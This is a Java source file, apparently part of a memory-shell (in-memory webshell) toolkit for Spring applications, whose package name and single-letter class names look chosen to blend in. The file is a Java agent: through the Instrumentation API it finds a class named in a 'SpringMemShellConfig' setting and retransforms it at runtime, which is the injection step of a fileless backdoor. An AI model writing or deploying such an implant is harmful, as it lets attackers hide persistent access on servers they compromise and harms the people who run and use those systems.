package org.apache.spring;


import java.io.IOException;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class m {
    public static final String TransformedClassName = c.SpringMemShellConfig.TransformedClassName;
    public static Instrumentation i = null;

    public static void agentmain(String agentArgs, Instrumentation inst) throws ClassNotFoundException, UnmodifiableClassException, IOException {
        i = inst;
        start();
    }

    public static String start() throws UnmodifiableClassException {
        final t t1 = new t();
        Class[] classes = i.getAllLoadedClasses();
        for (Class aClass : classes) {
            if (aClass.getName().equals(TransformedClassName)) {
                i.addTransformer(t1, true);
                i.retransformClasses(aClass);
                return "Success";
            }
        }
        return "ERROR::";
    }
}